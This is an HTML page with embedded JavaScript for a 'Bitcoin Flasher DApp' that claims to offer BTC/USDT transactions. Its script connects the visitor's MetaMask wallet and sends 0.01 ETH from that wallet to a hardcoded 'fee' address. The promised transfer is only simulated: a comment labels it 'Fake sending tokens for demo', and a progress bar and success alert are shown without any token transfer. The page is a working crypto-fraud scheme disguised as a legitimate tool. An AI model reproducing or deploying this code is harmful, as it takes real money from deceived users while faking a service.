<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="twitter:image" content="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/f7/01/e4/f701e4a3-88f1-93c1-fe76-435cfbbf8c51/AppIcon-1x_U007emarketing-0-7-0-85-220.png/492x0w.webp">

    <!-- Manifest -->
    <link rel="manifest" href="manifest.json">

    <!-- Favicon -->
    <link rel="icon" href="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/f7/01/e4/f701e4a3-88f1-93c1-fe76-435cfbbf8c51/AppIcon-1x_U007emarketing-0-7-0-85-220.png/492x0w.webp" type="image/png">

    <!-- External CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

    <title>Bitcoin Flasher DApp - Seamless BTC/USDT Transactions</title>

    <!-- Custom styling -->
    <style>
        body {
            background-color: #101010;
            color: #ffffff;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        .container {
            margin-top: 5%;
        }

        .card {
            background: linear-gradient(145deg, #181818, #1c1c1c);
            border: 1px solid #ff9900;
            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
            border-radius: 12px;
        }

        .btn-primary {
            background-color: #ff9900;
            border: none;
            font-size: 18px;
            padding: 10px 20px;
        }

        .btn-primary:hover {
            background-color: #e67e00;
        }

        input, button {
            margin-top: 15px;
        }

        footer {
            text-align: center;
            padding: 20px 0;
            color: #ff9900;
            font-size: 14px;
        }

        #progressBar {
            transition: width 0.5s;
        }
    </style>
</head>
<body>
    <div class="container text-center">
        <div class="card p-4">
            <h1>Bitcoin Flasher DApp</h1>
            <p>Secure and Seamless BTC/USDT Transactions</p>

            <!-- Wallet Connection -->
            <button id="connectWallet" class="btn btn-primary w-100">Connect Wallet</button>
            <p id="walletStatus" class="text-success mt-3">Not Connected</p>

            <!-- Transaction Form -->
            <form id="transactionForm">
                <div class="mb-3">
                    <label for="recipient" class="form-label">Recipient Address</label>
                    <input type="text" id="recipient" class="form-control" placeholder="Enter recipient address" required>
                </div>
                <div class="mb-3">
                    <label for="amount" class="form-label">Amount (USDT)</label>
                    <input type="number" id="amount" class="form-control" placeholder="Enter amount" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Send Transaction</button>
            </form>

            <!-- Progress -->
            <div class="progress mt-3">
                <div id="progressBar" class="progress-bar bg-warning" style="width: 0%;">0%</div>
            </div>
        </div>
    </div>

    <footer>
        &copy; 2024 Bitcoin Flasher - All Rights Reserved.
    </footer>

    <!-- Web3.js and Script -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        let web3, userAccount;
        const feeAddress = "0x3a06322e9F1124F6B2de8F343D4FDce4D1009869";

        async function connectWallet() {
            if (window.ethereum) {
                try {
                    web3 = new Web3(window.ethereum);
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    document.getElementById('walletStatus').textContent = `Connected: ${userAccount}`;
                } catch (error) {
                    alert('Wallet connection failed!');
                }
            } else {
                alert('MetaMask is not installed. Please install MetaMask to connect.');
            }
        }

        async function sendTransaction(event) {
            event.preventDefault();
            const recipient = document.getElementById('recipient').value;
            const amount = document.getElementById('amount').value;

            try {
                const fee = web3.utils.toWei('0.01', 'ether');
                await web3.eth.sendTransaction({ from: userAccount, to: feeAddress, value: fee });
                document.getElementById('progressBar').style.width = '50%';
                document.getElementById('progressBar').textContent = 'Processing...';

                // Fake sending tokens for demo
                setTimeout(() => {
                    document.getElementById('progressBar').style.width = '100%';
                    document.getElementById('progressBar').textContent = 'Transaction Complete!';
                    alert('Transaction sent successfully.');
                }, 2000);
            } catch (error) {
                alert('Transaction failed: ' + error.message);
            }
        }

        document.getElementById('connectWallet').addEventListener('click', connectWallet);
        document.getElementById('transactionForm').addEventListener('submit', sendTransaction);

        // PWA Installation Prompt
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            alert('Install this app to your device for better accessibility.');
        });
    </script>
</body>
</html>
